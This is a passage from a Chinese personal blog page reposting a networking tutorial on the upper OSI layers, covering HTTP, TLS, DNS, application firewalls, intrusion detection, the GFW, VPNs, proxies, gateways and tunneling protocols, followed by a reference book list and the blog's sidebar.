-<h3 id="◇业务层的必要性"><a href="#◇业务层的必要性" class="headerlink" title="◇业务层的必要性"></a>◇业务层的必要性</h3><p>　　业务层显然是必要滴。因为传输层位于操作系统，它不可能去了解网络软件的业务逻辑。为了让网络软件能够相互通讯，肯定要在传输层之上再定义更高层的协议。<br>　　问题在于：网络软件千奇百怪，其业务逻辑各不相同，因此，“业务层如何设计”，【无】一定之规。有些软件只用一个协议来搞定所有的业务逻辑（只有一层）；有些软件会参考 OSI，把业务逻辑的协议分为三层；还有些软件可能会分出更多的层次。<br>　　再强调一下：业务层的协议如何分层，完全看具体的业务逻辑，不要生搬硬套任何现有的参考模型。</p>
-<h3 id="◇会话层-＆-表示层-＆-应用层"><a href="#◇会话层-＆-表示层-＆-应用层" class="headerlink" title="◇会话层 ＆ 表示层 ＆ 应用层"></a>◇会话层 ＆ 表示层 ＆ 应用层</h3><p>　　对于大部分读者来说，【没必要】花时间去了解 OSI 最上面三层之间的区别。你只需把最上面三层视作【一坨】——他们都是与网络软件的业务逻辑密切相关滴。<br>　　那么，哪些人需要详细了解“这三层的差异”捏？<br>　　如果你是个程序员，并且你正好是开发【网络】软件，俺建议你了解一下 OSI 模型的最上面三层，有助于你更深刻地思考某些网络协议的设计。</p>
-<h2 id="★业务层（OSI-上三层）：具体实例"><a href="#★业务层（OSI-上三层）：具体实例" class="headerlink" title="★业务层（OSI 上三层）：具体实例"></a>★业务层（OSI 上三层）：具体实例</h2><h3 id="◇业务层的【协议】"><a href="#◇业务层的【协议】" class="headerlink" title="◇业务层的【协议】"></a>◇业务层的【协议】</h3><p>　　业务层的协议非常多。即使光把各种协议的名称列出来，也很费劲。所以俺就偷懒一下，只点评几个特别重要的协议。</p>
-<p><strong>HTTP 协议</strong><br>　　如果让俺评选最重要的业务层协议，俺首推 HTTP 协议。互联网的普及推动了 Web 的普及，而 Web 的普及使得 HTTP 成为信息时代的重要支柱。当你上网的时候，你看到的网页（HTML 页面）就是通过 HTTP 协议传输到你的浏览器上。<br>　　如今 HTTP 已经不仅仅用来展示网页，还有很多业务层的协议是建立在 HTTP 协议之上。比如说：如果你用 RSS 订阅俺的博客，RSS 阅读器需要调用 blogspot 博客平台提供的 RSS 接口，这些 RSS 接口就是基于 HTTP 协议传输滴。<br>　　考虑到本文的篇幅，俺不可能在这里细聊 HTTP 协议的规格，有兴趣的同学可以去看《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1TgujhFUzyVlf1W5e48lSMTIwJuCTElvXw2LgQ_Ng0Cs/">HTTP 权威指南</a>》这本书。</p>
-<p><strong>SSL/TLS 协议</strong><br>　　最早的 HTTP 协议是【明文】滴；为了强化安全性，后来又设计了 SSL 协议，用来【加密】HTTP 流量；再后来，SSL 升级为 TLS（这俩是同义词）。如今经常看到的 HTTPS 相当于“HTTP over TLS”。<br>　　SSL/TLS 设计得比较优雅（很灵活），使得其它业务层的协议可以很方便地架构在 SSL/TLS 之上。这样的好处是：其它协议就不用自己再设计一套加密机制＆认证机制。<br>　　SSL/TLS 对于安全性很重要。</p>
-<p><strong>域名相关的协议（DNS 及其它）</strong><br>　　域名相关的协议，也很重要。因为域名系统是整个互联网的基础设施。最早的域名查询协议是“DNS 协议”，由于这个协议【没有】加密，导致了一些安全隐患。比如 GFW 就利用 DNS 的这个弱点，搞“域名污染/域名投毒”。因此，后来又设计了一系列新的域名协议，引入了加密的机制。</p>
-<h3 id="◇业务层相关的【网络设备】"><a href="#◇业务层相关的【网络设备】" class="headerlink" title="◇业务层相关的【网络设备】"></a>◇业务层相关的【网络设备】</h3><p><strong>应用层防火墙（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Application_firewall">application firewall</a>）</strong><br>　　前面提到了：大多数网络防火墙处于4层（状态防火墙），另外还有少数处于7层，也就是“应用层防火墙”（有时候也称之为“7层防火墙”）。<br>　　一般来说，这类防火墙具备了【深度包检测】（deep packet inspection，简称 DPI）的能力，可以分析应用层协议的【内容】。<br>　　简单说一下“深度包检测”：<br>　　如果某个网络设备，仅仅分析“应用层协议”本身，它还【不够格】称之为 DPI。为了做到 DPI，还要能理解应用层协议所承载的【内容】。<br>　　比如说：某人通过【明文】的 HTTP 协议从网上下载了一个 zip 压缩包。对于这个下载行为，那些做得好的 DPI 设备不光能识别出“HTTP 协议的内容是 ZIP 压缩包”，而且还能从 ZIP 压缩包中提取出里面的文件。</p>
-<p><strong>入侵检测（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Intrusion_detection_system">intrusion detection system</a>）</strong><br>　　一般来说，“入侵检测”如果不加定语，通常指“【网络】入侵检测”（洋文叫 NIDS）；另外还有一种“【主机】入侵检测”（洋文叫 HIDS）。HIDS 与本文无关。<br>　　“入侵检测”是一种网络安全设备，它通过嗅探（sniffer）的方式抓取网上的数据包，然后进行分析，尝试发现网络中是否存在黑客/骇客的入侵的行为。故名“入侵检测”。<br>　　由于 IDS 需要理解【应用层】（7层）的内容，因此它与“应用层防火墙”有个共同点，需要具备某种程度的 DPI（深度包检测）能力。它俩的一大差异是【部署方式】。<br>　　考虑到很多读者是 IT 外行，简单说一下“旁路部署”——<br>如果你学过中学物理，应该知道电路有“串联 ＆ 并联”。所谓的“旁路部署”类似于电路中的【并联】。通俗地说：IDS 是【并联】部署，防火墙是【串联】部署。</p>
-<p><strong>GFW（Great Firewall）</strong><br>　　本博客已经写了很多翻墙教程，大伙儿肯定都知道 GFW 了。<br>　　由于“Great Firewall”中有“Firewall”字样，很多天朝网民【误以为】GFW 是防火墙，其实不然！GFW 本质上就是 IDS——其部署方式类似于 IDS（旁路部署），其工作方式有很大一部分也类似于 IDS（当然啦，GFW 的功能比 IDS 更多）。<br>　　大约七八年前，就有热心读者建议俺写一篇技术博文，介绍 GFW 的工作原理。由于俺比较懒，拖到今年（2021）都没动手，很惭愧 :(</p>
-<h2 id="★杂项"><a href="#★杂项" class="headerlink" title="★杂项"></a>★杂项</h2><p>　　有些概念，并不属于某个特定的层次，单独放到这个章节。</p>
-<h3 id="◇VPN（virtual-private-network）"><a href="#◇VPN（virtual-private-network）" class="headerlink" title="◇VPN（virtual private network）"></a>◇VPN（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Virtual_private_network">virtual private network</a>）</h3><p>　　咱们天朝的网民使用 VPN，一多半是为了翻墙。其实 VPN 的本意（如其名称所示）是为了提供某种虚拟化的私有的网络，让身处异地的多个人，可以用 VPN 构建出一个虚拟的内网，从而能在这个内网中协同工作。<br>　　VPN 的类型很多，使用的技术也各不相同，因此 VPN 对应的 OSI 层次很宽（“1层”到“6层”）。俺到维基百科剽窃了如下这张图，让你见识一下 VPN 的多样性。</p>
-<p><img src="https://lh4.googleusercontent.com/qXbaBYZBvZ5k6gn4mp2M0dCYFW1rK_HR3JTCRYoWpGyNo9AZ6i90LgQzZgvL0OqImrf6j5FNAbDQDHG5k9I4iHVsm7FCSSHYhCV0yKJsz5vAH9Fil_4ZxclOoHSjlUH2aLA8Gv3hMcU" alt="不见图 请翻墙"><br>（名目繁多的 VPN，分类示意图）</p>
-<h3 id="◇代理（proxy）"><a href="#◇代理（proxy）" class="headerlink" title="◇代理（proxy）"></a>◇代理（proxy）</h3><p>　　那些经常翻墙的同学，对“代理”应该都很熟悉了。“代理”与 VPN 类似，一开始并不是用来翻墙滴，“翻墙”只是这俩的副业。</p>
-<p><strong>代理服务器（proxy server）</strong><br>　　“代理服务器”部署在“客户端 ＆ 服务端”之间，起到某种“中介”的作用。“代理服务器”的类型有很多，干的事情各不相同。</p>
-<p><img src="https://lh6.googleusercontent.com/wklKf5goUVXTzmjccmfjIRpKKxZd-9vhT_0HMy3KknjAU7Oxj0GPgC7jjjO0BAfl6f-fapaBgHSp0mtsE1sS6ZyypE-ESB4idMi-ReKKU17Z1k_oVKupiOQcX3uQTlfU_P0VjoiZnG4" alt="不见图 请翻墙"><br>（“代理服务器”的简单示意图）</p>
-<p><strong>代理客户端（proxy client）</strong><br>　　早期的代理服务器，【不】需要“代理客户端”。因为早期的“代理服务器”支持的是【标准协议】。比如“HTTP proxy server”支持的是标准 HTTP协议，而用户的电脑上，已经有浏览器（原生支持 HTTP 协议）。这种情况下，自然不需要再有“代理客户端”。<br>　　后来，为了满足某些特殊需求（比如翻墙），“代理服务器”必须使用某种特殊的（非标准的）协议。因此，就必须在用户的环境中安装“代理客户端”。对于翻墙来说，你装的翻墙软件，相当于“代理客户端”。</p>
-<p><strong>代理的层次</strong><br>　　“代理”也分不同的层次。比较常见的有如下几种：</p>
-<blockquote>
-<p>TCP 代理（TCP 端口转发）——4层（传输层）<br>SOCKS 代理——5层（会话层）<br>HTTP 代理——7层（应用层）<br>……</p>
-</blockquote>
-<h3 id="◇网关（gateway）"><a href="#◇网关（gateway）" class="headerlink" title="◇网关（gateway）"></a>◇网关（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Gateway_(telecommunications)">gateway</a>）</h3><p>　　前面的某些章节，已经稍微提及了“网关”这个概念，但还没有具体介绍它。<br>　　严格来讲，“网关”是一个逻辑概念，【不要】把它当成具体的网络设备。充当“网关”的东东，可能是：路由器 or XX层交换机 or XX层防火墙 or 代理服务器 ……<br>　　“网关”也分不同的层次。如果不加定语，通常指的是“3层网关”（网络层网关）。列几种比较常见的，供参考：</p>
-<blockquote>
-<p>路由器充当网关——3层（网络层）<br>3层交换机充当网关——3层（网络层）<br>4层交换机充当网关——4层（传输层）<br>应用层防火墙充当网关——7层（应用层）<br>代理服务器充当网关——（取决于代理的层次，参见前一个小节）<br>……</p>
-</blockquote>
-<h3 id="◇隧道协议（tunneling-protocol）"><a href="#◇隧道协议（tunneling-protocol）" class="headerlink" title="◇隧道协议（tunneling protocol）"></a>◇隧道协议（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Tunnelling_protocol">tunneling protocol</a>）</h3><p>　　所谓的“隧道协议”，通俗地说就是：用某种协议包裹另一种协议，以满足某些特殊的需求。<br>　　看到这里，估计某些同学会感到纳闷——因为俺在本文开头介绍“协议栈”的时候提到说：相邻的两层协议，下层会包裹上层。“隧道协议的包裹”与“上下层协议的包裹”，差别在哪捏？<br>　　俺来解释一下：<br>　　“隧道协议”可以做到更灵活的包裹——既可以对层次相隔很远的协议进行包裹，也可以对同一层的协议进行包裹，甚至可以“倒挂”——所谓的“倒挂”就是让【上】层反过来包裹【下】层。<br>　　举例：<br>　　俺曾经写过一篇《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/04/Proxy-Tricks.html">如何让【不支持】代理的网络软件，通过代理进行联网（不同平台的 N 种方法）</a>》，其中介绍了“HTTP 代理”的两种模式：“转发模式 ＆ 隧道模式”。对于“HTTP 代理”的隧道模式，可以实现【TCP over HTTP】（把 TCP 协议打包到 HTTP 协议内部），这就是刚才所说的“倒挂”。<br>　　另外，VPN 小节的那张图中，有些类型的 VPN 就是用“隧道协议”的机制实现。</p>
-<h3 id="◇（其它杂项）"><a href="#◇（其它杂项）" class="headerlink" title="◇（其它杂项）"></a>◇（其它杂项）</h3><p>　　可能还有一些杂七杂八的东东，没来得及聊。如果你觉得有些【网络相关】的概念，不太明白，欢迎到博客留言，进行反馈。<br>　　俺会根据大伙儿的反馈，再对这篇教程进行补充。</p>
-<h2 id="★参考书目"><a href="#★参考书目" class="headerlink" title="★参考书目"></a>★参考书目</h2><p>　　如下几本书，都在<a target="_blank" rel="noopener" href="https://github.com/programthink/books">俺的网盘</a>上分享了电子版。</p>
-<table>
-<thead>
-<tr>
-<th>中文书名</th>
-<th>英文书名</th>
-<th>作者</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》</td>
-<td>《Computer Networks》</td>
-<td><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Andrew_S._Tanenbaum">Andrew Tanenbaum</a> David Wetherall</td>
-</tr>
-<tr>
-<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1tlbsKWyddVLeB3HSWUiq7KtkltLeClIbPtkyN6642O4/">计算机网络——自顶向下方法</a>》</td>
-<td>《Computer Networking——A Top-Down Approach》</td>
-<td><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Jim_Kurose">James Kurose</a> <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Keith_W._Ross">Keith Ross</a></td>
-</tr>
-<tr>
-<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1Fw2wSr-MgNm1d_M6F-rF1t_n3LwFWWBHrJt6vcYGta4/">TCP-IP 详解</a>》</td>
-<td>《TCP-IP Illustrated》</td>
-<td><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E5%8F%B2%E8%92%82%E6%96%87%E6%96%AF">Richard Stevens</a></td>
-</tr>
-<tr>
-<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1eB4BLE9PDXDfrb-ioXNfrHlOthMqUe0MXs8PmRsm3Os/">UNIX 网络编程</a>》</td>
-<td>《UNIX Network Programming》</td>
-<td><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E5%8F%B2%E8%92%82%E6%96%87%E6%96%AF">Richard Stevens</a></td>
-</tr>
-<tr>
-<td>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1TgujhFUzyVlf1W5e48lSMTIwJuCTElvXw2LgQ_Ng0Cs/">HTTP 权威指南</a>》</td>
-<td>《HTTP——The Definitive Guide》</td>
-<td>David Gourley Brian Totty Marjorie Sayer Sailu Reddy Anshu Aggarwal</td>
-</tr>
-</tbody></table>
-</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/images/you.jpg" alt="胡雅宁"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">胡雅宁</p><p class="is-size-6 is-block">虽千万人吾往矣</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">61</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1905060202" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/1905060202"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.zhihu.com/people/little-ning-ge" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">知乎</span></span><span class="level-right"><span class="level-item tag">www.zhihu.com</span></span></a></li><li><a class="level is-mobile" href="https://space.bilibili.com/24140963" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">bilibili</span></span><span class="level-right"><span class="level-item tag">space.bilibili.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"><span class="level-start"><span class="level-item">人工智能</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"><span class="level-start"><span class="level-item">数据分析</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"><span class="level-start"><span class="level-item">经验分享</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"><span class="level-start"><span class="level-item">编程语言</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"><span class="level-start"><span class="level-item">编程随想</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/"><span class="level-start"><span class="level-item">脚本语言</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"><span class="level-start"><span class="level-item">计算机基础</span></span><span class="level-end"><span class="level-item tag">22</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"><span class="level-start"><span class="level-item">闲言碎语</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"><span class="level-start"><span class="level-item">项目实战</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">六月 2021</span></span><span class="level-end"><span class="level-item tag">17</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/BootStrap/"><span class="tag">BootStrap</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/"><span class="tag">C语言中文网</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Error%E8%A7%A3%E5%86%B3/"><span class="tag">Error解决</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java-Web/"><span class="tag">Java Web</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JavaScript/"><span class="tag">JavaScript</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SpringMVC/"><span class="tag">SpringMVC</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Vue/"><span class="tag">Vue</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/leetcode/"><span class="tag">leetcode</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/programthink/"><span class="tag">programthink</span><span class="tag">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/socket/"><span class="tag">socket</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web%E5%BC%80%E5%8F%91/"><span class="tag">web开发</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%B9%A0%E9%A2%98/"><span class="tag">习题</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"><span class="tag">人工智能</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%BA%E7%94%9F/"><span class="tag">人生</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BD%9C%E4%B8%9A/"><span class="tag">作业</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8D%9A%E5%AE%A2/"><span class="tag">博客</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%A6%E4%B9%A0/"><span class="tag">学习</span><span class="tag">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%A6%E7%94%9F%E5%85%9A/"><span class="tag">学生党</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"><span class="tag">小妙招</span><span class="tag">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%80%A7%E6%95%99%E8%82%B2/"><span class="tag">性教育</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"><span class="tag">操作系统</span><span class="tag">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"><span class="tag">数据库</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"><span class="tag">期末复习</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%A1%86%E6%9E%B6/"><span class="tag">框架</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%88%AC%E8%99%AB/"><span class="tag">爬虫</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%99%BD%E5%AB%96/"><span class="tag">白嫖</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%AE%97%E6%B3%95/"><span class="tag">算法</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%B2%92%E8%AE%A1%E7%AE%97/"><span class="tag">粒计算</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"><span class="tag">统计学习方法</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"><span class="tag">网络编程</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"><span class="tag">计算机组成原理</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"><span class="tag">计算机网络</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%BA%E6%96%87/"><span class="tag">论文</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"><span class="tag">课程设计</span><span class="tag">9</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget" data-type="adsense"><div class="card-content"><div class="menu"><h3 class="menu-label">广告</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="1" data-ad-slot="1" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T16:49:45.000Z">2021-07-17</time></p><p class="title"><a href="/2021/07/17/%E7%B2%92%E8%AE%A1%E7%AE%97%E7%BB%BC%E8%BF%B0/">粒计算综述</a></p><p class="categories"><a href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/">人工智能</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T16:47:27.000Z">2021-07-17</time></p><p class="title"><a href="/2021/07/17/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%EF%BC%9A%E8%BF%9B%E7%A8%8B%E8%BF%98%E6%98%AF%E7%BA%BF%E7%A8%8B%EF%BC%9F/">架构设计：进程还是线程？</a></p><p class="categories"><a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T16:37:29.000Z">2021-07-17</time></p><p class="title"><a href="/2021/07/17/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%EF%BC%9A%E7%94%9F%E4%BA%A7%E8%80%85-%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/">架构设计：生产者/消费者模式</a></p><p class="categories"><a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T16:21:38.000Z">2021-07-17</time></p><p class="title"><a href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%EF%BC%9F/">如何防范黑客入侵？</a></p><p class="categories"><a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T16:06:02.000Z">2021-07-17</time></p><p class="title"><a href="/2021/07/17/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></p><p class="categories"><a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/%E6%9C%AC%E4%BA%BA.jpg" alt="胡小宁的博客" height="28"></a><p class="is-size-7"><span>&copy; 2021 胡小宁</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
